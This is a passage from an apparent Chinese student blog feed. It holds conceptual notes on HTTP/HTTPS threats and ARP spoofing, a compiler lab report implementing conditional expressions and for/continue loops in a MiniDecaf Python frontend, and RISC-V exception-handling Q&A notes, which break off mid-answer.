TCP/IP 上的一个客户/服务器程序.</li></ul></li><li>Web 安全威胁:<ul><li>威胁方式:<ul><li>主动攻击: 伪装成其它用户, 篡改消息或 Web 站点信息.</li><li>被动攻击: 在浏览器和服务器通信窃听, 获得限制使用的权限.</li></ul></li><li>威胁位置:<ul><li>Web 服务器安全.</li><li>Web 客户端安全.</li><li>服务器和客户端间的通信安全.</li></ul></li></ul></li><li>Web 流量安全方法:<ul><li>IP 级安全:<ul><li>IPSec 对终端用户和应用透明, 提供通用解决方案, 具有过滤功能.</li></ul></li><li>TCP 级安全:<ul><li>SSL 或 TLS 作为下层协议, 可对应用透明, 也可在特定包中使用.</li></ul></li><li>应用级安全:<ul><li>为应用定制安全协议, 典型应用是安全电子交易 SET.</li></ul></li></ul></li></ul><h3 id="针对-HTTP-的攻击"><a href="#针对-HTTP-的攻击" class="headerlink" title="针对 HTTP 的攻击"></a>针对 HTTP 的攻击</h3><ul><li>HTTP 的缺陷:<ul><li>明文传输, 没有数据完整性校验.</li><li>无状态连接, 无法验证双方身份.</li></ul></li><li>HTTP 攻击:<ul><li>监听嗅探:<ul><li>HTTP 采用明文信息传输, 可以被直接嗅探.</li></ul></li><li>篡改劫持:<ul><li>攻击者修改通信数据包, 篡改信息和劫持会话.</li></ul></li><li>伪造服务器:<ul><li>HTTP 不验证服务器可信度, 存在 ARP、DNS 欺骗及钓鱼风险.</li></ul></li></ul></li><li>ARP 欺骗:<ul><li>攻击者制造伪造的 ARP frame.</li><li>修改网内任何计算机的映射表.</li><li>切断目标主机的网络通讯, 窃取关键信息.</li><li>本机网卡可以抓取到被攻击者 HTTP 请求, 获取明文密码等敏感信息.</li></ul></li></ul><h3 id="HTTPS-HTTP-SSL"><a href="#HTTPS-HTTP-SSL" class="headerlink" title="HTTPS = HTTP + SSL"></a>HTTPS = HTTP + SSL</h3><ul><li>HTTPS 是协议的合并, 解决了数据加密、完整性校验、服务器身份认证等问题.<ul><li>HTTP 协议是简单的无状态连接.</li><li>HTTPS 协议是可进行加密传输、身份认证的连接.</li></ul></li><li>ARP 欺骗/报文篡改/服务器认证/证书替换/会话劫持.</li><li>HTTPS 无法避免 ARP 欺骗和嗅探攻击, 但 SSL 加密传输, 无法得到明文信息.</li><li>HTTPS 内容不压缩也是无法识别的密文, 攻击者无法进行报文篡改.</li><li>HTTPS 的加密证书在证书管理机构申请后发放, 拥有证书的单位不可被仿冒.<ul><li>HTTP 无法验证服务器身份, 某些浏览器的网站身份验证基于网站域名的, 遇到 DNS 劫持/欺骗时无法抵抗.</li></ul></li><li>HTTPS 通过钓鱼 WIFI 或恶意代理访问网站, 服务器证书可能被替换, 浏览器用红色表示地址栏并提示证书不受信任.</li><li>HTTPS 通信不全基于 HTTPS 协议, 百度只在登录采用 HTTPS 传输用户信息.</li></ul><h3 id="SSL-能否确保-HTTPS-安全"><a href="#SSL-能否确保-HTTPS-安全" class="headerlink" title="SSL 能否确保 HTTPS 安全"></a>SSL 能否确保 HTTPS 安全</h3><ul><li>SSLStrip 是专门针对 HTTPS 的攻击.</li></ul>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> Network Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Network Security </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>编译原理 实验4</title>
      <link href="/2023/11/26/bian-yi-yuan-li-lab-4/"/>
      <url>/2023/11/26/bian-yi-yuan-li-lab-4/</url>
      
        <content type="html"><![CDATA[<h1 id="Stage-4-报告"><a href="#Stage-4-报告" class="headerlink" title="Stage 4 报告"></a>Stage 4 报告</h1><h2 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h2><h3 id="step-7"><a href="#step-7" class="headerlink" title="step 7"></a>step 7</h3><p><strong>语义分析</strong>: 直接全部访问 <code>ConditionExpression</code> 的子节点即可.</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># frontend/typecheck/namer.py</span><span class="token keyword">def</span> <span class="token function">visitCondExpr</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> expr<span class="token punctuation">:</span> ConditionExpression<span class="token punctuation">,</span> ctx<span class="token punctuation">:</span> ScopeStack<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token boolean">None</span><span class="token punctuation">:</span>    expr<span class="token punctuation">.</span>cond<span class="token punctuation">.</span>accept<span class="token punctuation">(</span>self<span class="token punctuation">,</span> ctx<span class="token punctuation">)</span>    expr<span class="token punctuation">.</span>then<span class="token punctuation">.</span>accept<span class="token punctuation">(</span>self<span class="token punctuation">,</span> ctx<span class="token punctuation">)</span>    expr<span class="token punctuation">.</span>otherwise<span class="token punctuation">.</span>accept<span class="token punctuation">(</span>self<span class="token punctuation">,</span> ctx<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>中间代码生成</strong>: 直接参考对 <code>if</code> 语句的实现, 由于 <code>ConditionExpression</code> 需要返回值, 在 <code>mv.visitCondBranch</code> 结束后, 使用 <code>expr.cond.getattr("val")</code> 储存该表达式的值 (这也是与 <code>visitIf</code> 的不同点).</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># frontend/tacgen/tacgen.py</span><span class="token keyword">def</span> <span class="token function">visitCondExpr</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> expr<span class="token punctuation">:</span> ConditionExpression<span class="token punctuation">,</span> mv<span class="token punctuation">:</span> TACFuncEmitter<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token boolean">None</span><span class="token punctuation">:</span>    expr<span class="token punctuation">.</span>cond<span class="token punctuation">.</span>accept<span class="token punctuation">(</span>self<span class="token punctuation">,</span> mv<span class="token punctuation">)</span>    skipLabel <span class="token operator">=</span> mv<span class="token punctuation">.</span>freshLabel<span class="token punctuation">(</span><span class="token punctuation">)</span>    exitLabel <span class="token operator">=</span> mv<span class="token punctuation">.</span>freshLabel<span class="token punctuation">(</span><span class="token punctuation">)</span>    exprVal <span class="token operator">=</span> expr<span class="token punctuation">.</span>cond<span class="token punctuation">.</span><span class="token builtin">getattr</span><span class="token punctuation">(</span><span class="token string">"val"</span><span class="token punctuation">)</span>    mv<span class="token punctuation">.</span>visitCondBranch<span class="token punctuation">(</span>        tacop<span class="token punctuation">.</span>CondBranchOp<span class="token punctuation">.</span>BEQ<span class="token punctuation">,</span> exprVal<span class="token punctuation">,</span> skipLabel    <span class="token punctuation">)</span>    expr<span class="token punctuation">.</span>then<span class="token punctuation">.</span>accept<span class="token punctuation">(</span>self<span class="token punctuation">,</span> mv<span class="token punctuation">)</span>    mv<span class="token punctuation">.</span>visitAssignment<span class="token punctuation">(</span>exprVal<span class="token punctuation">,</span> expr<span class="token punctuation">.</span>then<span class="token punctuation">.</span><span class="token builtin">getattr</span><span class="token punctuation">(</span><span class="token string">"val"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># Here!</span>    mv<span class="token punctuation">.</span>visitBranch<span class="token punctuation">(</span>exitLabel<span class="token punctuation">)</span>    mv<span class="token punctuation">.</span>visitLabel<span class="token punctuation">(</span>skipLabel<span class="token punctuation">)</span>    expr<span class="token punctuation">.</span>otherwise<span class="token punctuation">.</span>accept<span class="token punctuation">(</span>self<span class="token punctuation">,</span> mv<span class="token punctuation">)</span>    mv<span class="token punctuation">.</span>visitAssignment<span class="token punctuation">(</span>exprVal<span class="token punctuation">,</span> expr<span class="token punctuation">.</span>otherwise<span class="token punctuation">.</span><span class="token builtin">getattr</span><span class="token punctuation">(</span><span class="token string">"val"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># Here!</span>    mv<span class="token punctuation">.</span>visitLabel<span class="token punctuation">(</span>exitLabel<span class="token punctuation">)</span>    expr<span class="token punctuation">.</span><span class="token builtin">setattr</span><span class="token punctuation">(</span><span class="token string">"val"</span><span class="token punctuation">,</span> exprVal<span class="token punctuation">)</span> <span class="token comment"># Here!</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="step-8"><a href="#step-8" class="headerlink" title="step 8"></a>step 8</h3><p>这一部分需要实现 <code>For</code> 与 <code>Continue</code> 语句.</p><p><strong>词法&amp;语法分析</strong>: 在 <code>frontend/lexer/lex.py</code> 添加 <code>For</code> 与 <code>Continue</code> 的关键字类型, 在 <code>frontend/ast/tree.py</code> 和 <code>frontend/ast/visitor.py</code> 实现 AST 节点及访问函数.</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># frontend/ast/tree.py</span><span class="token keyword">class</span> <span class="token class-name">For</span><span class="token punctuation">(</span>Statement<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>        self<span class="token punctuation">,</span>      init<span class="token punctuation">:</span> Expression<span class="token punctuation">,</span>      cond<span class="token punctuation">:</span> Expression<span class="token punctuation">,</span>      update<span class="token punctuation">:</span> Expression<span class="token punctuation">,</span>      body<span class="token punctuation">:</span> Statement    <span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token builtin">super</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span><span class="token string">"for"</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>init <span class="token operator">=</span> init        self<span class="token punctuation">.</span>cond <span class="token operator">=</span> cond        self<span class="token punctuation">.</span>update <span class="token operator">=</span> update        self<span class="token punctuation">.</span>body <span class="token operator">=</span> body<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token class-name">Continue</span><span class="token punctuation">(</span>Statement<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token builtin">super</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span><span class="token string">"continue"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中 <code>For</code> 节点的成员可能为空, 但为了语法分析的简便, 没有使用 <code>Optional</code> 进行定义. 为消除可能带来的隐患, 只需在<strong>中间代码生成</strong>中添加相应检查即可. 定义上下文无关文法, 注意 <code>init</code> 成员可能为 <code>Declaration</code> 或 <code>Expression</code>.</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># frontend/parser/ply_parser.py</span><span class="token keyword">def</span> <span class="token function">p_for</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    statement_matched : For LParen init_expression Semi opt_expression Semi opt_expression RParen statement_matched    statement_unmatched : For LParen init_expression Semi opt_expression Semi opt_expression RParen statement_unmatched    """</span>    p<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> For<span class="token punctuation">(</span>p<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span> p<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">,</span> p<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">,</span> p<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">p_for_init</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    init_expression : opt_expression    init_expression : declaration    """</span>    p<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> p<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>语义分析</strong>: 在 <code>ScopeStack</code> 数据结构中增加维护当前 <code>loop</code> 的层数.</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># frontend/scope/scopestack.py</span><span class="token keyword">class</span> <span class="token class-name">ScopeStack</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> globalScope<span class="token punctuation">:</span> Scope<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>        self<span class="token punctuation">.</span>loopCount <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">def</span> <span class="token function">enterLoop</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>loopCount <span class="token operator">+=</span> <span class="token number">1</span>    <span class="token keyword">def</span> <span class="token function">exitLoop</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>loopCount <span class="token operator">-=</span> <span class="token number">1</span>    <span class="token keyword">def</span> <span class="token function">insideLoop</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>loopCount<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>为 <code>For</code> 和 <code>While</code> 循环添加 <code>loop</code> 层数信息, 同时在进入 <code>For</code> 循环体时打开一个新的 <code>scope</code>.</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># frontend/typecheck/namer.py</span><span class="token keyword">def</span> <span class="token function">visitFor</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> stmt<span class="token punctuation">:</span> For<span class="token punctuation">,</span> ctx<span class="token punctuation">:</span> ScopeStack<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token boolean">None</span><span class="token punctuation">:</span>    ctx<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    stmt<span class="token punctuation">.</span>init<span class="token punctuation">.</span>accept<span class="token punctuation">(</span>self<span class="token punctuation">,</span> ctx<span class="token punctuation">)</span>    stmt<span class="token punctuation">.</span>cond<span class="token punctuation">.</span>accept<span class="token punctuation">(</span>self<span class="token punctuation">,</span> ctx<span class="token punctuation">)</span>    stmt<span class="token punctuation">.</span>update<span class="token punctuation">.</span>accept<span class="token punctuation">(</span>self<span class="token punctuation">,</span> ctx<span class="token punctuation">)</span>    ctx<span class="token punctuation">.</span>enterLoop<span class="token punctuation">(</span><span class="token punctuation">)</span>    stmt<span class="token punctuation">.</span>body<span class="token punctuation">.</span>accept<span class="token punctuation">(</span>self<span class="token punctuation">,</span> ctx<span class="token punctuation">)</span>    ctx<span class="token punctuation">.</span>exitLoop<span class="token punctuation">(</span><span class="token punctuation">)</span>    ctx<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">visitWhile</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> stmt<span class="token punctuation">:</span> While<span class="token punctuation">,</span> ctx<span class="token punctuation">:</span> ScopeStack<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token boolean">None</span><span class="token punctuation">:</span>    stmt<span class="token punctuation">.</span>cond<span class="token punctuation">.</span>accept<span class="token punctuation">(</span>self<span class="token punctuation">,</span> ctx<span class="token punctuation">)</span>    ctx<span class="token punctuation">.</span>enterLoop<span class="token punctuation">(</span><span class="token punctuation">)</span>    stmt<span class="token punctuation">.</span>body<span class="token punctuation">.</span>accept<span class="token punctuation">(</span>self<span class="token punctuation">,</span> ctx<span class="token punctuation">)</span>    ctx<span class="token punctuation">.</span>exitLoop<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">visitBreak</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> stmt<span class="token punctuation">:</span> Break<span class="token punctuation">,</span> ctx<span class="token punctuation">:</span> ScopeStack<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token boolean">None</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> ctx<span class="token punctuation">.</span>insideLoop<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">raise</span> DecafBreakOutsideLoopError<span class="token punctuation">(</span><span class="token punctuation">)</span>    ctx<span class="token punctuation">.</span>exitLoop<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">visitContinue</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> stmt<span class="token punctuation">:</span> Continue<span class="token punctuation">,</span> ctx<span class="token punctuation">:</span> ScopeStack<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token boolean">None</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> ctx<span class="token punctuation">.</span>insideLoop<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">raise</span> DecafContinueOutsideLoopError<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>中间代码生成</strong>: 参考 <code>visitWhile</code> 实现了 <code>visitFor</code>, 参考 <code>visitBreak</code> 实现了 <code>visitContinue</code>. <code>For</code> 循环的控制流参考了<a href="https://decaf-lang.github.io/minidecaf-tutorial/docs/step8/example.html#%E4%B8%AD%E9%97%B4%E4%BB%A3%E7%A0%81%E7%94%9F%E6%88%90">这里</a>给出的 TAC 码, 需要注意由于我们在 AST 节点实现中挖的坑, <code>stmt.cond</code> 可能为 <code>NULL</code>, 需要以此为依据判定是否添加 <code>BEQ</code> 指令跳转 (虽然测例里都是完整的 <code>for</code> 循环, 不会出现这个问题).</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># frontend/tacgen/tacgen.py</span><span class="token keyword">def</span> <span class="token function">visitFor</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> stmt<span class="token punctuation">:</span> For<span class="token punctuation">,</span> mv<span class="token punctuation">:</span> TACFuncEmitter<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token boolean">None</span><span class="token punctuation">:</span>    beginLabel <span class="token operator">=</span> mv<span class="token punctuation">.</span>freshLabel<span class="token punctuation">(</span><span class="token punctuation">)</span>    loopLabel <span class="token operator">=</span> mv<span class="token punctuation">.</span>freshLabel<span class="token punctuation">(</span><span class="token punctuation">)</span>    breakLabel <span class="token operator">=</span> mv<span class="token punctuation">.</span>freshLabel<span class="token punctuation">(</span><span class="token punctuation">)</span>    mv<span class="token punctuation">.</span>openLoop<span class="token punctuation">(</span>breakLabel<span class="token punctuation">,</span> loopLabel<span class="token punctuation">)</span>    stmt<span class="token punctuation">.</span>init<span class="token punctuation">.</span>accept<span class="token punctuation">(</span>self<span class="token punctuation">,</span> mv<span class="token punctuation">)</span>    mv<span class="token punctuation">.</span>visitLabel<span class="token punctuation">(</span>beginLabel<span class="token punctuation">)</span>    <span class="token keyword">if</span> stmt<span class="token punctuation">.</span>cond<span class="token punctuation">:</span>        stmt<span class="token punctuation">.</span>cond<span class="token punctuation">.</span>accept<span class="token punctuation">(</span>self<span class="token punctuation">,</span> mv<span class="token punctuation">)</span>        mv<span class="token punctuation">.</span>visitCondBranch<span class="token punctuation">(</span>tacop<span class="token punctuation">.</span>CondBranchOp<span class="token punctuation">.</span>BEQ<span class="token punctuation">,</span> stmt<span class="token punctuation">.</span>cond<span class="token punctuation">.</span><span class="token builtin">getattr</span><span class="token punctuation">(</span><span class="token string">"val"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> breakLabel<span class="token punctuation">)</span>    stmt<span class="token punctuation">.</span>body<span class="token punctuation">.</span>accept<span class="token punctuation">(</span>self<span class="token punctuation">,</span> mv<span class="token punctuation">)</span>    mv<span class="token punctuation">.</span>visitLabel<span class="token punctuation">(</span>loopLabel<span class="token punctuation">)</span>    stmt<span class="token punctuation">.</span>update<span class="token punctuation">.</span>accept<span class="token punctuation">(</span>self<span class="token punctuation">,</span> mv<span class="token punctuation">)</span>    mv<span class="token punctuation">.</span>visitBranch<span class="token punctuation">(</span>beginLabel<span class="token punctuation">)</span>    mv<span class="token punctuation">.</span>visitLabel<span class="token punctuation">(</span>breakLabel<span class="token punctuation">)</span>    mv<span class="token punctuation">.</span>closeLoop<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="思考题"><a href="#思考题" class="headerlink" title="思考题"></a>思考题</h2><h3 id="step-7-1"><a href="#step-7-1" class="headerlink" title="step 7"></a>step 7</h3><ol><li><p>你使用语言的框架里是如何处理悬吊 else 问题的? 请简要描述.</p><p> <strong>答:</strong> <code>statement</code> 有 <code>statement_matched</code> 代表 <code>if</code> 与 <code>else</code> 匹配, 以及 <code>statement_unmatched</code> 代表仅有 <code>if</code>.</p><p> 若出现 <code>if</code>, <code>else</code> 匹配, 其之间一定是 <code>statement_matched</code> 的匹配类型, 这使得后续的悬吊 <code>else</code> 只能与同层的 <code>if</code> 结合, 构成 <code>statement_matched</code> 后, 这就是 <code>else</code> 与一个最近未匹配 <code>if</code> 的匹配.</p></li><li><p>在实验要求的语义规范中, 条件表达式存在短路现象. 即:</p> <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> b <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">?</span> <span class="token number">1</span> <span class="token operator">:</span> <span class="token punctuation">(</span>a <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> a<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> 会返回 0 而不是 2. 如果要求条件表达式不短路, 在你的实现中该做何种修改? 简述你的思路.</p><p> <strong>答:</strong> 修改 <code>frontend/tacgen/tacgen.py:visitCondExpr</code>, 将 <code>expr.then.accept(self, mv)</code>, <code>expr.otherwise.accept(self, mv)</code> 均提至函数首部即可, 这样条件表达式必定会访问 <code>then</code> 及 <code>otherwise</code>, 从而避免短路.</p></li></ol><h3 id="step-8-1"><a href="#step-8-1" class="headerlink" title="step 8"></a>step 8</h3><ol><li><p>将循环语句翻译成 IR 有许多可行的翻译方法, 例如 <code>while</code> 循环可以有以下两种翻译方式:</p><p> 第一种 (即实验指导中的翻译方式):</p><ul><li><code>label BEGINLOOP_LABEL</code>: 开始下一轮迭代</li><li><code>cond 的 IR</code></li><li><code>beqz BREAK_LABEL</code>: 条件不满足就终止循环</li><li><code>body 的 IR</code></li><li><code>label CONTINUE_LABEL</code>: continue 跳到这</li><li><code>br BEGINLOOP_LABEL</code>: 本轮迭代完成</li><li><p><code>label BREAK_LABEL</code>: 条件不满足，或者 break 语句都会跳到这儿</p><p>第二种:</p></li><li><p><code>cond 的 IR</code></p></li><li><code>beqz BREAK_LABEL</code>: 条件不满足就终止循环</li><li><code>label BEGINLOOP_LABEL</code>: 开始下一轮迭代</li><li><code>body 的 IR</code></li><li><code>label CONTINUE_LABEL</code>: continue 跳到这</li><li><code>cond 的 IR</code></li><li><code>bnez BEGINLOOP_LABEL</code>: 本轮迭代完成，条件满足时进行下一次迭代</li><li><p><code>label BREAK_LABEL</code>: 条件不满足，或者 break 语句都会跳到这儿</p><p>从执行的指令的条数这个角度 (<code>label</code> 不算做指令, 假设循环体至少执行了一次), 请评价这两种翻译方式哪一种更好?</p><p><strong>答:</strong> <strong>第二种</strong>翻译方式更好. 假设循环执行到不满足 <code>cond</code> 结束, 第一种翻译每个循环需要执行 <code>body</code>, <code>cond</code> 以及两次跳转, 而第二种翻译除了首次进入循环需要判定 <code>cond</code>, 其余每个循环只需执行一次跳转. 就普遍意义而言, 第二种翻译方式生成的程序比第一种每个循环少执行一次跳转, 这种翻译方式更好.</p></li></ul></li><li><p>我们目前的 TAC IR 中条件分支指令采用了单分支目标 (标签) 的设计, 即该指令的操作数中只有一个是标签; 如果相应的分支条件不满足, 则执行流会继续向下执行. 在其它 IR 中存在双目标分支 (标签) 的条件分支指令, 其形式如下:</p> <pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">br cond, false_target, true_target<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> 其中 <code>cond</code> 是一个临时变量, <code>false_target</code> 和 <code>true_target</code> 是标签. 其语义为: 如果 <code>cond</code> 的值为 0 (假), 则跳转到 <code>false_target</code> 处; 若 <code>cond</code> 非 0 (真), 则跳转到 <code>true_target</code> 处. 它与我们的条件分支指令的区别在于执行流总是会跳转到两个标签中的一个. 你认为中间表示的哪种条件分支指令设计 (单目标 vs 双目标)更合理? 为什么?</p><p> <strong>答:</strong> 我认为选择 “双目标分支” 更合理:</p><ul><li>双目标分支指令更加灵活, 符合编程语言的控制流结构, 允许根据条件跳转到两个不同位置, 在实现 <code>if-elif-else</code> 等结构会更方便.</li><li>双目标分支指令含义直观, 容易理解和调试, 能够提高代码的可读性和维护性.</li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> Compiler </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Principles of Compiler </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机组成原理 笔记7</title>
      <link href="/2023/11/16/ji-suan-ji-zu-cheng-yuan-li-bi-ji-7/"/>
      <url>/2023/11/16/ji-suan-ji-zu-cheng-yuan-li-bi-ji-7/</url>
      
        <content type="html"><![CDATA[<h1 id="Exception"><a href="#Exception" class="headerlink" title="Exception"></a>Exception</h1><h2 id="Q-amp-A"><a href="#Q-amp-A" class="headerlink" title="Q&amp;A"></a>Q&amp;A</h2><ol><li><p>在支持中断异常的监控程序当中一共涉及几个内核态? 监控程序工作在什么内核态上? 什么时候会进入用户态 (U 态)?</p><p> <strong>答:</strong> 1 个; M 态; 在 <code>shell.S</code> 中执行 G 命令进入 <code>.ENTER_UESR</code> 执行 <code>mret</code>.</p></li><li><p>观察监控程序中 CSR 寄存器的变化. 监控程序在执行 G 命令执行用户程序时, 是如何切换内核态, 并跳转到对应位置的?</p><p> <strong>答:</strong> 设置 mepc, mpp, 执行 <code>mret</code> 指令跳转到对应位置.</p></li><li><p>用户程序执行 ecall 指令之后会发生什么?</p><p> <strong>答:</strong> 引发异常, 进入 M 态 <code>EXCEPTION_HANDLER</code>, 执行 <code>.HANDLE_ECALL</code> 代码段.</p></li><li><p>考虑中断处理. 监控程序的异常处理函数中严格过滤掉了在 M 态发生的时钟中断. 如何在异常处理函数中判断当前处理的异常发生在什么态? 来自 M 态的时钟中断会发生吗?</p><p> <strong>答:</strong> 读取 mstatus.mpp, 判断当前状态; 不会被发生和处理.</p></li><li><p>中断发生的具体条件是什么? 监控程序中发生的中断类型是?</p><p> <strong>答:</strong> mie 和 mip 相应位置 1; 时钟中断.</p></li><li><p>用户程序在执行完成后 (执行 <code>jr ra</code> 指令回到监控程序后) 会发生什么?</p><p> <strong>答:</strong> 跳转到 <code>.USERRET_USER</code>.</p></li><li><p>如何判断 CPU 当前运行在什么内核态? 这个信息有暴露给软件吗?</p><p> <strong>答:</strong> 在 CPU 内部每个流水阶段传递内核态信息; 没有, 软件只有在处理异常时可以获取发生异常时 CPU 的状态.</p></li><li><p>如何读写 mtime 和 mtimecmp 寄存器 (与串口的状态和数据寄存器进行类比)?</p><p> <strong>答:</strong> 在 mem_master 中重定向时钟寄存器地址, 增加单独的读写逻辑.</p></li><li><p>监控程序在处理 mtvec 寄存器时使用了复杂的逻辑. 结合 Privileged 2.3 节解释其原因, 并理解什么是 WARL.</p><p> <strong>答:</strong> mtvec 寄存器用于定义异常处理程序的基地址, RISC-V 允许两种异常处理模式: 直接模式和向量模式, 通过 mtvec 寄存器的最低位来设置; WARL 属性意味着对于某些寄存器, 当写入一个地址时, 